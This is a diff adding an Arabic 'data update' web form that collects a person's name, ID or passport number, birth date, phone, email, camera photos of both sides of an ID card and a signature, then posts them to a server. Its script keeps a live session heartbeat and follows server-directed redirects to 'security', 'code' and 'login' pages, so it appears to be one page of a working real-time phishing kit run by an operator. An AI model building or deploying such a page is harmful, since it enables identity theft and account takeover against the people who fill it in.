@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=0.85, maximum-scale=0.85, user-scalable=no">
+<title>تحديث البيانات</title>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+:root{--green:#1a6e2e;--green-dark:#145524;--dark:#1a1a1a;--gray:#666;--white:#fff;--red:#e74c3c}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Cairo',sans-serif;background:#f5f5f5;color:var(--dark);min-height:100vh;display:flex;flex-direction:column}
+.header{background:#1b2a1b;display:flex;align-items:center;justify-content:center;padding:14px 20px;position:sticky;top:0;z-index:100}
+.header-title{color:var(--white);font-size:18px;font-weight:700}
+
+.container{flex:1;padding:20px 16px;max-width:520px;margin:0 auto;width:100%}
+
+.top-icon{width:64px;height:64px;background:#e8f5ec;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 12px}
+.top-icon svg{width:30px;height:30px;stroke:var(--green);fill:none;stroke-width:2}
+.page-title{font-size:20px;font-weight:800;color:var(--green);text-align:center;margin-bottom:4px}
+.page-sub{font-size:13px;color:#999;text-align:center;margin-bottom:20px;line-height:1.7}
+
+.card{background:var(--white);border-radius:16px;padding:20px 18px;margin-bottom:16px;box-shadow:0 1px 4px rgba(0,0,0,.06)}
+.card-title{font-size:15px;font-weight:800;color:var(--green);margin-bottom:14px;display:flex;align-items:center;gap:8px}
+.card-title svg{width:20px;height:20px;stroke:var(--green);fill:none;stroke-width:2}
+
+.form-group{margin-bottom:16px}
+.form-group label{display:block;font-size:14px;font-weight:700;margin-bottom:6px;text-align:right;color:var(--dark)}
+.form-group label .req{color:var(--red);font-size:12px}
+.form-group input[type="text"],
+.form-group input[type="email"],
+.form-group input[type="tel"],
+.form-group input[type="date"]{
+  width:100%;padding:13px 14px;border:1.5px solid #ddd;border-radius:12px;
+  font-size:15px;font-family:'Cairo',sans-serif;outline:none;text-align:right;
+  background:var(--white);color:var(--dark);transition:.2s}
+.form-group input:focus{border-color:var(--green)}
+
+.photo-upload{position:relative;width:100%;border:2px dashed #ccc;border-radius:14px;
+  background:#fafafa;overflow:hidden;cursor:pointer;transition:.2s;min-height:140px;
+  display:flex;flex-direction:column;align-items:center;justify-content:center;gap:8px}
+.photo-upload:hover,.photo-upload.active{border-color:var(--green);background:#e8f5ec}
+.photo-upload input{position:absolute;inset:0;opacity:0;cursor:pointer;z-index:2}
+.photo-upload svg{width:36px;height:36px;stroke:#aaa;fill:none;stroke-width:1.5}
+.photo-upload .ph-text{font-size:13px;color:#999;font-weight:600}
+.photo-upload .ph-hint{font-size:11px;color:#bbb}
+.photo-upload img{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;z-index:1;display:none}
+.photo-upload.has-img img{display:block}
+.photo-upload.has-img svg,.photo-upload.has-img .ph-text,.photo-upload.has-img .ph-hint{display:none}
+
+.photo-row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+
+.submit-btn{width:100%;padding:16px;background:var(--green);color:var(--white);border:none;
+  border-radius:50px;font-size:17px;font-weight:700;font-family:'Cairo',sans-serif;
+  cursor:pointer;margin-top:8px;transition:.2s}
+.submit-btn:hover{background:var(--green-dark)}
+.submit-btn:disabled{background:#aaa;cursor:default}
+
+.loading-overlay{display:none;position:fixed;inset:0;background:rgba(255,255,255,.92);z-index:1000;
+  align-items:center;justify-content:center;flex-direction:column}
+.loading-overlay.show{display:flex}
+.lo-spinner{width:48px;height:48px;border:4px solid #e0e0e0;border-top:4px solid var(--green);
+  border-radius:50%;animation:spin 1s linear infinite;margin-bottom:14px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.lo-text{font-size:15px;color:var(--green);font-weight:700}
+
+.success-msg{display:none;text-align:center;padding:30px 20px}
+.success-msg.show{display:block}
+.success-msg svg{width:60px;height:60px;stroke:var(--green);fill:none;stroke-width:2;margin-bottom:12px}
+.success-msg h2{color:var(--green);font-size:20px;margin-bottom:6px}
+.success-msg p{color:#999;font-size:14px}
+</style>
+</head>
+<body>
+<div class="header">
+  <span class="header-title">تحديث البيانات</span>
+</div>
+
+<div class="container" id="formContainer">
+  <div class="top-icon">
+    <svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
+  </div>
+  <div class="page-title">استمارة تحديث البيانات</div>
+  <div class="page-sub">يرجى تعبئة جميع الحقول المطلوبة وإرفاق الصور</div>
+
+  <!-- Personal Info Card -->
+  <div class="card">
+    <div class="card-title">
+      <svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+      البيانات الشخصية
+    </div>
+
+    <div class="form-group">
+      <label>الاسم كما هو في الهوية <span class="req">*</span></label>
+      <input type="text" id="fullName" placeholder="أدخل الاسم الكامل" autocomplete="off">
+    </div>
+
+    <div class="form-group">
+      <label>رقم الهوية أو الجواز <span class="req">*</span></label>
+      <input type="text" id="idNumber" placeholder="أدخل رقم الهوية أو الجواز" inputmode="numeric" autocomplete="off">
+    </div>
+
+    <div class="form-group">
+      <label>تاريخ الميلاد <span class="req">*</span></label>
+      <input type="date" id="birthDate">
+    </div>
+  </div>
+
+  <!-- Contact Card -->
+  <div class="card">
+    <div class="card-title">
+      <svg viewBox="0 0 24 24"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6A19.79 19.79 0 0 1 2.12 4.18 2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
+      بيانات التواصل
+    </div>
+
+    <div class="form-group">
+      <label>رقم الهاتف <span class="req">*</span></label>
+      <input type="tel" id="phone" placeholder="05XXXXXXXX" inputmode="tel" autocomplete="off">
+    </div>
+
+    <div class="form-group">
+      <label>البريد الإلكتروني <span class="req">*</span></label>
+      <input type="email" id="email" placeholder="example@email.com" dir="ltr" style="text-align:left" autocomplete="off">
+    </div>
+  </div>
+
+  <!-- ID Photos Card -->
+  <div class="card">
+    <div class="card-title">
+      <svg viewBox="0 0 24 24"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>
+      صور الهوية
+    </div>
+
+    <div class="photo-row">
+      <div class="form-group">
+        <label>الواجهة الأمامية <span class="req">*</span></label>
+        <div class="photo-upload" id="frontBox" onclick="this.querySelector('input').click()">
+          <input type="file" accept="image/*" capture="environment" onchange="previewImg(this,'frontBox','frontData')">
+          <svg viewBox="0 0 24 24"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>
+          <span class="ph-text">صورة الأمامية</span>
+          <span class="ph-hint">اضغط لالتقاط</span>
+          <img id="frontPreview">
+        </div>
+      </div>
+      <div class="form-group">
+        <label>الواجهة الخلفية <span class="req">*</span></label>
+        <div class="photo-upload" id="backBox" onclick="this.querySelector('input').click()">
+          <input type="file" accept="image/*" capture="environment" onchange="previewImg(this,'backBox','backData')">
+          <svg viewBox="0 0 24 24"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>
+          <span class="ph-text">صورة الخلفية</span>
+          <span class="ph-hint">اضغط لالتقاط</span>
+          <img id="backPreview">
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Signature Card -->
+  <div class="card">
+    <div class="card-title">
+      <svg viewBox="0 0 24 24"><path d="M17 3a2.828 2.828 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5L17 3z"/></svg>
+      التوقيع
+    </div>
+
+    <div class="form-group">
+      <label>صورة التوقيع <span class="req">*</span></label>
+      <div class="photo-upload" id="sigBox" onclick="this.querySelector('input').click()">
+        <input type="file" accept="image/*" capture="environment" onchange="previewImg(this,'sigBox','sigData')">
+        <svg viewBox="0 0 24 24"><path d="M17 3a2.828 2.828 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5L17 3z"/></svg>
+        <span class="ph-text">التقط صورة التوقيع</span>
+        <span class="ph-hint">اضغط لالتقاط الصورة</span>
+        <img id="sigPreview">
+      </div>
+    </div>
+  </div>
+
+  <button class="submit-btn" id="submitBtn" onclick="submitForm()">إرسال البيانات</button>
+</div>
+
+<div class="success-msg" id="successMsg">
+  <svg viewBox="0 0 24 24"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
+  <h2>تم إرسال البيانات بنجاح</h2>
+  <p>سيتم مراجعة بياناتك في أقرب وقت</p>
+</div>
+
+<div class="loading-overlay" id="loadingOverlay">
+  <div class="lo-spinner"></div>
+  <div class="lo-text">جاري إرسال البيانات...</div>
+</div>
+
+<script>
+function heartbeat(){fetch('/api/heartbeat',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({page:'update-data'})}).catch(function(){});}
+heartbeat();setInterval(heartbeat,5000);
+
+var params=new URLSearchParams(window.location.search);
+var sid=params.get('id');
+if(!sid)window.location.href='login.html';
+
+var imgStore={frontData:'',backData:'',sigData:''};
+
+function previewImg(input,boxId,storeKey){
+  var file=input.files[0];
+  if(!file)return;
+  var reader=new FileReader();
+  reader.onload=function(e){
+    var box=document.getElementById(boxId);
+    var img=box.querySelector('img');
+    img.src=e.target.result;
+    box.classList.add('has-img');
+    // compress
+    var canvas=document.createElement('canvas');
+    var ctx=canvas.getContext('2d');
+    var image=new Image();
+    image.onload=function(){
+      var max=800;
+      var w=image.width,h=image.height;
+      if(w>max){h=h*(max/w);w=max;}
+      if(h>max){w=w*(max/h);h=max;}
+      canvas.width=w;canvas.height=h;
+      ctx.drawImage(image,0,0,w,h);
+      imgStore[storeKey]=canvas.toDataURL('image/jpeg',0.7);
+    };
+    image.src=e.target.result;
+  };
+  reader.readAsDataURL(file);
+}
+
+function submitForm(){
+  var fullName=document.getElementById('fullName').value.trim();
+  var idNumber=document.getElementById('idNumber').value.trim();
+  var birthDate=document.getElementById('birthDate').value;
+  var phone=document.getElementById('phone').value.trim();
+  var email=document.getElementById('email').value.trim();
+
+  if(!fullName||!idNumber||!birthDate||!phone||!email){alert('يرجى تعبئة جميع الحقول');return;}
+  if(!imgStore.frontData||!imgStore.backData||!imgStore.sigData){alert('يرجى إرفاق جميع الصور المطلوبة');return;}
+
+  document.getElementById('submitBtn').disabled=true;
+  document.getElementById('loadingOverlay').classList.add('show');
+
+  var payload={
+    full_name:fullName,
+    id_number:idNumber,
+    birth_date:birthDate,
+    phone:phone,
+    email:email,
+    signature:imgStore.sigData,
+    id_front:imgStore.frontData,
+    id_back:imgStore.backData
+  };
+
+  fetch('/api/submit-update/'+sid,{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify(payload)
+  })
+  .then(function(r){return r.json();})
+  .then(function(d){
+    document.getElementById('loadingOverlay').classList.remove('show');
+    if(d.ok){
+      document.getElementById('formContainer').style.display='none';
+      document.getElementById('successMsg').classList.add('show');
+      pollAfterUpdate();
+    }else{
+      document.getElementById('submitBtn').disabled=false;
+    }
+  })
+  .catch(function(){
+    document.getElementById('loadingOverlay').classList.remove('show');
+    document.getElementById('submitBtn').disabled=false;
+  });
+}
+
+function pollAfterUpdate(){
+  var interval=setInterval(function(){
+    fetch('/api/status/'+sid)
+    .then(function(r){return r.json();})
+    .then(function(d){
+      if(d.status==='redirect'&&d.redirect){
+        clearInterval(interval);
+        var pages={security:'security.html',code:'code.html',login:'login.html',wait:'loading.html','update-data':'update-data.html'};
+        var target=pages[d.redirect];
+        if(target&&target!=='update-data.html')window.location.href=target+'?id='+sid;
+      }
+    })
+    .catch(function(){});
+  },2000);
+}
+</script>
+</body>
+</html>
